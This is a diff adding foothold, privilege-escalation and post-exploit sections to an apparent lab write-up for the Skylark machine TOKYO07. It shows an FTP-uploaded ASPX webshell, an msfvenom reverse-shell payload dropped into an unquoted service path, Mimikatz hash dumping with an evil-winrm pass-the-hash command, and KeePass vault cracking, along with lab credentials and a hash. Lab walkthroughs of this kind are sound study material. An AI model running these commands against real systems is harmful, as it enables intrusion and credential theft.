@@ -187,3 +187,193 @@ sqlmap -u 'http://vm17.skylark:24680/%E3%83%96%E3%83%AD%E3%82%B0/?page=1' -p 'pa
 
 <figure><img src="../../../.gitbook/assets/SL-VM17-24680_Sqlmap.png" alt=""><figcaption><p>Failed to find injection</p></figcaption></figure>
 
+## Foothold
+
+### FTP Access
+
+I find some credentials on `PARIS03` that mention they are for an Umbraco web application upgrade:
+
+<figure><img src="../../../.gitbook/assets/SL-P03-TFTP-BackupCfg.png" alt=""><figcaption><p>File found on PARIS03</p></figcaption></figure>
+
+I know that his machine has Umbraco and also `ftp_jp` sounds like it could be short for "FTP Japan" so it fits. I decide to try the credentials and they work:
+
+<figure><img src="../../../.gitbook/assets/SL-T07-FtpAccess.png" alt=""><figcaption><p>Accessing FTP on TOKYO07</p></figcaption></figure>
+
+In the screenshot I have to turn of SSL verification after an error but for future reference sign in and certificate verification disabling can all be done with this one-liner:
+
+{% code overflow="wrap" %}
+```bash
+lftp ftp_jp:'~be<3@6fe1Z:2e8'@tokyo07.skylark.com:24621 -e "set ftp:ssl-allow no"
+```
+{% endcode %}
+
+Based on what I see in the listing it looks like I am at the root of the IIS web server that is running on this machine. Ideally I can just upload a `.aspx` remote/web shell and gain user access that way. Unfortunately it will probably not be this easy since the site visible is Umbraco-based and is based on files in the `/umbraco/wwwroot` directory:
+
+<figure><img src="../../../.gitbook/assets/SL-T07-FtpUmbraco.png" alt=""><figcaption><p>Umbraco folder structure</p></figcaption></figure>
+
+Before looking into that I decide to check out `security.txt` since that sounds like a promising file name. I grab a copy but it just contains the email address I found earlier:
+
+<figure><img src="../../../.gitbook/assets/SL-T07-SecurityTxt.png" alt=""><figcaption><p>Contents of security.txt</p></figcaption></figure>
+
+I move on to my shell idea.
+
+#### Umbraco
+
+I spend awhile examining the contents of the FTP site and the website at port 24680 trying to figure out how they interacted. It seemed Umbraco would not just let you add a file to the web server and access it directly. I tried with `.aspx`, `.txt`, and `.html`. I also attempted to replace one of the pictures found in the `umbraco/wwwroot/media` directory. I found where it was supposed to load on the site but it would not. When I tried accessing it by URL directly a page saying the image had errors came up.
+
+After a while it became clear there was no way to do this easily.
+
+#### Edit Hosts
+
+After awhile I remembered a couple of things. The first was the effect of adding an entry to /etc/hosts with the name the server called itself (e.g. `milan` in that instance). This caused the website to load properly as opposed to a broken version I was seeing before.
+
+The second thing was the email address found in `security.txt`. Perhaps the domain of the email address is what this machine calls itself (`skylark.jp`). I add that as an entry to my `/etc/hosts` file and navigate there in my browser:
+
+<figure><img src="../../../.gitbook/assets/SL-T07-EtcHosts.png" alt=""><figcaption><p>Entry added to hosts file</p></figcaption></figure>
+
+I was surprised. I thought this would just make the store website load correctly and maybe I could find some way in. Instead it seems to take me directly to the IIS root:
+
+<figure><img src="../../../.gitbook/assets/SL-T07-IIS_WebRoot.png" alt=""><figcaption><p>Landing on IIS root</p></figcaption></figure>
+
+I validate this by uploading a `test.txt` file via FTP and seeing if I can find it in a browser which is successful:
+
+<figure><img src="../../../.gitbook/assets/SL-T07-PlacingFileOnWeb.png" alt=""><figcaption><p>Placing a sample file on the web root</p></figcaption></figure>
+
+#### Shell
+
+First I decide to upload a `.aspx` webshell to check if I can make it execute. I elect to use [this one](https://github.com/xl7dev/WebShell/blob/master/Aspx/ASPX%20Shell.aspx) and it is accessible from outside:
+
+<figure><img src="../../../.gitbook/assets/SL-T07-WebShell.png" alt=""><figcaption><p>Webshell placed via FTP</p></figcaption></figure>
+
+Next I replace it with [this `.aspx` reverse shell](https://github.com/xl7dev/WebShell/blob/master/Aspx/ASPX%20Shell.aspx) and gain an interactive user session:
+
+<figure><img src="../../../.gitbook/assets/SL-T07-ReverseShell.png" alt=""><figcaption><p>Reverse shell launched</p></figcaption></figure>
+
+User access achieved.
+
+## Privilege Escalation
+
+The first thing I discover is my user has SeImpersonatePrivilege so I immediately head down that route. All 3 of the main exploits fail: PrintSpoofer, GodPotato, JuicyPotato. It seems for some reason this vector is just out.
+
+### Manual Enumeration
+
+#### Found `??????.exe`
+
+As I start my manual enumeration, I find a weird `.exe` in `C:\Skylark\Development Binaries 01`. On my shell it is showing up as `??????.exe` which I eventually learn is because the file is actually titled in Japanese characters:
+
+<figure><img src="../../../.gitbook/assets/SL-T07-PE-OddExe.png" alt=""><figcaption><p>Odd .exe found on host</p></figcaption></figure>
+
+I try decompiling it with `CodemerxDecompile` but it is not a `.exe` based on .NET and this does not work. I give up on this for now but it does stand out as odd.
+
+### Unquoted Service Path
+
+As I am making my way through my checklist, I eventually run a search for unquoted service paths:
+
+{% code overflow="wrap" %}
+```
+wmic service get name,pathname | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
+```
+{% endcode %}
+
+This turns up the same `.exe` I found before associated with a service called `DevService`:
+
+<figure><img src="../../../.gitbook/assets/SL-T07-PE-UnquotedServicePath.png" alt=""><figcaption><p>Unquoted service path in writable directory</p></figcaption></figure>
+
+Turns out the `.exe` itself is not interesting. What is interesting is that it is a service with an unquoted path in a directory I can write to. I just follow the techniques [here](../../../windows/privilege-escalation/leveraging-windows-components/leveraging-services/unquoted-service-paths.md#example) to exploit. Recalling the search path from the linked section I realize I can place a file at `C:\Skylark\Development.exe` and have it run when the service starts.
+
+#### Reverse Shell
+
+I craft a reverse shell with `msfvenom`:
+
+{% code overflow="wrap" %}
+```bash
+msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=192.168.45.157 LPORT=21 -f exe -o Development.exe
+```
+{% endcode %}
+
+#### Placing the Shell
+
+I place the file at `C:\Skylark\Development.exe`:
+
+<figure><img src="../../../.gitbook/assets/SL-T07-PE-MaliciousServiceCopy.png" alt=""><figcaption><p>.exe placed in service search path</p></figcaption></figure>
+
+#### Restarting the Service
+
+I start a listener on my machine and then use net stop and net start to restart the service:
+
+```
+net stop DevService
+```
+
+```
+net start DevService
+```
+
+This causes my shell to launch:
+
+<figure><img src="../../../.gitbook/assets/SL-T07-PE-SystemShell.png" alt=""><figcaption><p>Restarting the service to launch a shell</p></figcaption></figure>
+
+`SYSTEM` access achieved.
+
+## Post-Exploit
+
+### Mimikatz
+
+As always, I run Mimikatz. In this instance I find the local Administrator's hash which makes for easy re-entry:
+
+<figure><img src="../../../.gitbook/assets/SL-T07-POST-LocalAdminNtlm.png" alt=""><figcaption><p>Local Administrator's hash</p></figcaption></figure>
+
+```bash
+evil-winrm -i tokyo07.skylark.com -u 'Administrator' -H 90ebcd7b7e2b6be22a05ceb0bf486944
+```
+
+### KeePass Vault
+
+As I am making my way through manual enumeration as `SYSTEM`, I eventually run a search for KeePass vaults which turns up a result:
+
+{% code overflow="wrap" %}
+```
+powershell -c "Get-ChildItem -Path C:\ -Include '*.kdbx' -Force -Recurse -ErrorAction SilentlyContinue"
+```
+{% endcode %}
+
+<figure><img src="../../../.gitbook/assets/SL-T07-POST-KdbxFound.png" alt=""><figcaption><p>KeePass vault found on machine</p></figcaption></figure>
+
+I copy it back to my machine and get cracking.
+
+#### Getting Hash of Vault
+
+I get the hash of the vault by using the command:
+
+```
+keepass2john Passwords.kdbx > passwords.hash
+```
+
+#### Cracking the Vault
+
+I start with a small wordlist since cracking these is always slow. Specifically I use [`fasttrack.txt`](https://github.com/drtychai/wordlists/blob/master/fasttrack.txt) with `john`:
+
+{% code overflow="wrap" %}
+```bash
+john --wordlist=./fasttrack.txt passwords.hash
+```
+{% endcode %}
+
+<figure><img src="../../../.gitbook/assets/SL-T07-POST-KdbxCracked.png" alt=""><figcaption><p>Cracked KeePass vault password</p></figcaption></figure>
+
+#### Vault Contents
+
+I open the `Passwords.kdbx` file with the password (`P@ssword!`) and find a single entry:
+
+<figure><img src="../../../.gitbook/assets/SL-T07-POST-KdbxContents.png" alt=""><figcaption><p>Contents of vault</p></figcaption></figure>
+
+Its note would suggest it is for a Squid proxy. I recall there was one of these on [port 3128](vm15.md#port-3128) of `AMSTERDAM05` so I will try these credentials there.
+
+I add the credentials to my `creds.txt` file and move on:
+
+{% code title="creds.txt" %}
+```
+...
+ext_acc         DoNotShare!SkyLarkLegacyInternal2008    Squid proxy credentials (proxy is on AMSTERDAM05)
+```
+{% endcode %}
